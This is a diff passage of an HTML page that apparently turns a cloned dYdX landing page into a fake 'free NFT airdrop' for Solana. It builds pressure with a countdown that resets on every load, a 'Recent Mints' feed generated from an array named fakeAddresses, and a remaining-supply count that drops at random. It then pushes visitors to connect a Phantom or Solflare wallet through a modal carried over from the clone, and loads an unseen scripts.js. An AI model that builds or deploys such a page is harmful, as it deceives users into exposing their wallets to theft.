+            <div class="stat-label">Remaining</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number">2.5 SOL</div>
+            <div class="stat-label">Mint Price → FREE</div>
+        </div>
+    </div>
+
+    <!-- Countdown -->
+    <div class="countdown">
+        <div class="countdown-label">⏰ Mint ends in</div>
+        <div class="timer">
+            <div class="timer-block">
+                <div class="timer-number" id="days">24</div>
+                <div class="timer-label">Days</div>
+            </div>
+            <div class="timer-block">
+                <div class="timer-number" id="hours">00</div>
+                <div class="timer-label">Hours</div>
+            </div>
+            <div class="timer-block">
+                <div class="timer-number" id="minutes">00</div>
+                <div class="timer-label">Minutes</div>
+            </div>
+            <div class="timer-block">
+                <div class="timer-number" id="seconds">00</div>
+                <div class="timer-label">Seconds</div>
             </div>
         </div>
     </div>
 
-    <div id="wallet-modal" class="wallet-modal" style="display: none;">
-        <div class="wallet-modal-overlay"></div>
-        <div class="wallet-modal-content">
-            <div class="wallet-modal-header">
-                <h3>Select Your Wallet</h3>
-                <button class="wallet-modal-close" id="close-modal">&times;</button>
+    <!-- Connect Section -->
+    <div class="connect-section">
+        <button type="button" id="connect-wallet" class="connect-btn">Connect Wallet to Mint Free NFT</button>
+        <div class="wallet-requirement">
+            ⚡ <span>Wallet connection required</span> to verify eligibility and receive your free NFT
+        </div>
+        <div class="wallet-requirement" style="margin-top: 10px; font-size: 12px;">
+            🔒 Only gas fees required • No hidden costs • Verified collection
+        </div>
+    </div>
+
+    <!-- Recent Claims -->
+    <div class="recent-claims">
+        <h3>🔄 Recent Mints</h3>
+        <div class="claims-list" id="claims-list">
+            <div class="claim-item">
+                <span class="check">✅</span>
+                <span class="address">8xK1...3mPq</span>
+                <span class="nft-name">minted Genesis #234</span>
             </div>
-            <div class="wallet-modal-body">
-                <div class="wallet-options" id="wallet-options">
-                    <div class="wallet-option" id="phantom-wallet" data-wallet="phantom">
-                        <div class="wallet-icon">
-                            <img src="https://docs.phantom.com/favicon.svg" alt="Phantom" width="48" height="48" style="border-radius: 12px;">
-                        </div>
-                        <div class="wallet-info">
-                            <div class="wallet-name">Phantom</div>
-                            <div class="wallet-status" id="phantom-status">
-                                <span class="status-dot"></span>
-                                <span class="status-text">Checking...</span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="wallet-option" id="solflare-wallet" data-wallet="solflare">
-                        <div class="wallet-icon">
-                            <img src="https://solflare.com/favicon.ico" alt="Solflare" width="48" height="48" style="border-radius: 12px;">
-                        </div>
-                        <div class="wallet-info">
-                            <div class="wallet-name">Solflare</div>
-                            <div class="wallet-status" id="solflare-status">
-                                <span class="status-dot"></span>
-                                <span class="status-text">Checking...</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="wallet-loading-state" id="wallet-loading-state">
-                    <div class="wallet-loading-spinner">
-                        <img src="https://docs.phantom.com/favicon.svg" alt="Phantom" class="phantom-icon">
-                    </div>
-                    <div class="wallet-loading-title">Connecting Wallet</div>
-                    <div class="wallet-loading-subtitle">Please connect your wallet to continue.<br>Check your wallet extension for connection requests.</div>
-                </div>
+            <div class="claim-item">
+                <span class="check">✅</span>
+                <span class="address">Hj9L...2aRf</span>
+                <span class="nft-name">minted Nebula #891</span>
+            </div>
+            <div class="claim-item">
+                <span class="check">✅</span>
+                <span class="address">Pq2W...9vXc</span>
+                <span class="nft-name">minted Star #4456</span>
+            </div>
+            <div class="claim-item">
+                <span class="check">✅</span>
+                <span class="address">Mn7T...4kLp</span>
+                <span class="nft-name">minted Void #7822</span>
             </div>
         </div>
     </div>
 
-    <main class="main">
-        <div class="w-layout-vflex hero_section">
-            <section class="hero_home-2 ks-section-13">
-                <div class="home_hero_container-2 custom-margin">
-                    <h1 class="ks-h1-2">DeFi's Pro Trading Platform</h1>
-                    <p class="ks-mb-2-3 ks-text-lg max-ch-50">dYdX reimagines what DeFi and perpetual trading can be. Combining the freedom of decentralization with deep liquidity, advanced order types, a high-performance API, and instant market listings, dYdX empowers you to trade boldly and confidently.</p>
-                    <div class="w-layout-vflex ks-btn-wrapper-2">
-                        <button type="button" id="connect-wallet-hero" class="button w-inline-block">Connect Wallet</button>
-                    </div>
-                </div>
-                <div class="wave-image-bg">
-                    <img src="https://cdn.prod.website-files.com/649ca755d082f1dfc4ed62a4/688779ba9980fb0717caa280_header_gradient.png" loading="eager" sizes="100vw" srcset="https://cdn.prod.website-files.com/649ca755d082f1dfc4ed62a4/688779ba9980fb0717caa280_header_gradient-p-500.png 500w, https://cdn.prod.website-files.com/649ca755d082f1dfc4ed62a4/688779ba9980fb0717caa280_header_gradient-p-800.png 800w, https://cdn.prod.website-files.com/649ca755d082f1dfc4ed62a4/688779ba9980fb0717caa280_header_gradient-p-1080.png 1080w, https://cdn.prod.website-files.com/649ca755d082f1dfc4ed62a4/688779ba9980fb0717caa280_header_gradient-p-1600.png 1600w, https://cdn.prod.website-files.com/649ca755d082f1dfc4ed62a4/688779ba9980fb0717caa280_header_gradient-p-2000.png 2000w, https://cdn.prod.website-files.com/649ca755d082f1dfc4ed62a4/688779ba9980fb0717caa280_header_gradient-p-2600.png 2600w, https://cdn.prod.website-files.com/649ca755d082f1dfc4ed62a4/688779ba9980fb0717caa280_header_gradient.png 3008w" alt="" class="wave-image">
-                    <div class="wave-overlay"></div>
-                </div>
-            </section>
+    <div class="footer">
+        <p>© 2024 Galactic Genesis NFT | Exclusive Airdrop for Early Supporters | Solana Blockchain</p>
+    </div>
+</div>
 
-            <section class="trading_metrics-2 ks-section-13">
-                <div class="ks-container-xl-13">
-                    <div class="ks-text-eyebrow-4">Why dYdX?</div>
-                    <h2 class="ks-h2-6 ks-mb-20-3">Trusted at Scale</h2>
-                    <div class="w-layout-grid home_trading_metrics_grid-3">
-                        <div class="stat-container-4">
-                            <div class="w-layout-vflex ks-numbers-wrapper">
-                                <div>$1.4T</div>
-                            </div>
-                            <div class="ks-h4-4 ks-text-color-tertiary-11 text-weight-medium">Lifetime Volume</div>
-                        </div>
-                        <div class="dydx-components--stat-container">
-                            <div class="w-layout-vflex dydx-components--ks-numbers-wrapper">
-                                <div>$200M</div>
-                            </div>
-                            <div class="dydx-components--ks-h4 dydx-components--ks-text-color-tertiary dydx-components--text-weight-medium">Open Interest</div>
-                        </div>
-                        <div class="dydx-components--stat-container">
-                            <div class="w-layout-vflex dydx-components--ks-numbers-wrapper">
-                                <div>220+</div>
-                            </div>
-                            <div class="dydx-components--ks-h4 dydx-components--ks-text-color-tertiary dydx-components--text-weight-medium">Markets</div>
-                        </div>
-                        <div class="dydx-components--stat-container">
-                            <div class="w-layout-vflex dydx-components--ks-numbers-wrapper">
-                                <div>$12M</div>
-                            </div>
-                            <div class="dydx-components--ks-h4 dydx-components--ks-text-color-tertiary dydx-components--text-weight-medium">MegaVault TVL</div>
-                        </div>
-                    </div>
-                </div>
-            </section>
+<!-- Wallet Modal (Preserved from original) -->
+<div id="wallet-modal" class="wallet-modal" style="display: none;">
+    <div class="wallet-modal-overlay"></div>
+    <div class="wallet-modal-content">
+        <div class="wallet-modal-header">
+            <h3>Select Your Wallet</h3>
+            <button class="wallet-modal-close" id="close-modal">&times;</button>
         </div>
-    </main>
+        <div class="wallet-modal-body">
+            <div class="wallet-options" id="wallet-options">
+                <div class="wallet-option" id="phantom-wallet" data-wallet="phantom">
+                    <div class="wallet-icon">
+                        <img src="https://docs.phantom.com/favicon.svg" alt="Phantom" width="48" height="48" style="border-radius: 12px;">
+                    </div>
+                    <div class="wallet-info">
+                        <div class="wallet-name">Phantom</div>
+                        <div class="wallet-status" id="phantom-status">
+                            <span class="status-dot"></span>
+                            <span class="status-text">Checking...</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="wallet-option" id="solflare-wallet" data-wallet="solflare">
+                    <div class="wallet-icon">
+                        <img src="https://solflare.com/favicon.ico" alt="Solflare" width="48" height="48" style="border-radius: 12px;">
+                    </div>
+                    <div class="wallet-info">
+                        <div class="wallet-name">Solflare</div>
+                        <div class="wallet-status" id="solflare-status">
+                            <span class="status-dot"></span>
+                            <span class="status-text">Checking...</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="wallet-loading-state" id="wallet-loading-state">
+                <div class="wallet-loading-spinner">
+                    <img src="https://docs.phantom.com/favicon.svg" alt="Phantom" style="width: 40px; height: 40px; border-radius: 10px;">
+                </div>
+                <div class="wallet-loading-title">Connecting Wallet</div>
+                <div class="wallet-loading-subtitle">Please connect your wallet to continue.<br>Check your wallet extension for connection requests.</div>
+            </div>
+        </div>
+    </div>
+</div>
 
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://unpkg.com/@solana/web3.js@1.30.0/lib/index.iife.min.js"></script>
-    <script src="scripts.js"></script>
+<script>
+    // Generate floating particles
+    function createParticles() {
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 50; i++) {
+            const particle = document.createElement('div');
+            particle.classList.add('particle');
+            const size = Math.random() * 4 + 2;
+            particle.style.width = size + 'px';
+            particle.style.height = size + 'px';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDuration = Math.random() * 15 + 10 + 's';
+            particle.style.animationDelay = Math.random() * 10 + 's';
+            particlesContainer.appendChild(particle);
+        }
+    }
+    createParticles();
+
+    // Countdown Timer (24 hours from page load)
+    let timeLeft = 24 * 60 * 60;
+    const timerInterval = setInterval(() => {
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            document.getElementById('days').innerText = '00';
+            document.getElementById('hours').innerText = '00';
+            document.getElementById('minutes').innerText = '00';
+            document.getElementById('seconds').innerText = '00';
+            return;
+        }
+        timeLeft--;
+        const days = Math.floor(timeLeft / (24 * 60 * 60));
+        const hours = Math.floor((timeLeft % (24 * 60 * 60)) / (60 * 60));
+        const minutes = Math.floor((timeLeft % (60 * 60)) / 60);
+        const seconds = timeLeft % 60;
+        document.getElementById('days').innerText = days.toString().padStart(2, '0');
+        document.getElementById('hours').innerText = hours.toString().padStart(2, '0');
+        document.getElementById('minutes').innerText = minutes.toString().padStart(2, '0');
+        document.getElementById('seconds').innerText = seconds.toString().padStart(2, '0');
+    }, 1000);
+
+    // Simulate random new claims
+    const fakeAddresses = [
+        '9xL1...2mNq', 'Hj9M...3aRf', 'Pq2W...9vXc', 'Mn7T...4kLp',
+        'Rk3B...6zQw', 'Lp9C...8yUj', 'Vb2N...1rFg', 'Xc5V...7hJk'
+    ];
+    const fakeNFTs = [
+        'Genesis', 'Nebula', 'Star', 'Void', 'Galaxy', 'Comet', 'Nova', 'Asteroid'
+    ];
+    
+    setInterval(() => {
+        const claimsList = document.getElementById('claims-list');
+        const randomAddress = fakeAddresses[Math.floor(Math.random() * fakeAddresses.length)];
+        const randomNFT = fakeNFTs[Math.floor(Math.random() * fakeNFTs.length)];
+        const randomNumber = Math.floor(Math.random() * 9999) + 1;
+        const newClaim = document.createElement('div');
+        newClaim.className = 'claim-item';
+        newClaim.innerHTML = `<span class="check">✅</span><span class="address">${randomAddress}</span><span class="nft-name">minted ${randomNFT} #${randomNumber}</span>`;
+        claimsList.insertBefore(newClaim, claimsList.firstChild);
+        if (claimsList.children.length > 8) {
+            claimsList.removeChild(claimsList.lastChild);
+        }
+    }, 15000);
+
+    // Update remaining count randomly
+    setInterval(() => {
+        const remainingEl = document.getElementById('remaining-count');
+        let current = parseInt(remainingEl.innerText);
+        if (current > 1200) {
+            const newRemaining = current - Math.floor(Math.random() * 3) - 1;
+            remainingEl.innerText = newRemaining;
+        }
+    }, 8000);
+</script>
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="https://unpkg.com/@solana/web3.js@1.30.0/lib/index.iife.min.js"></script>
+<script src="scripts.js"></script>
 </body>
 </html>
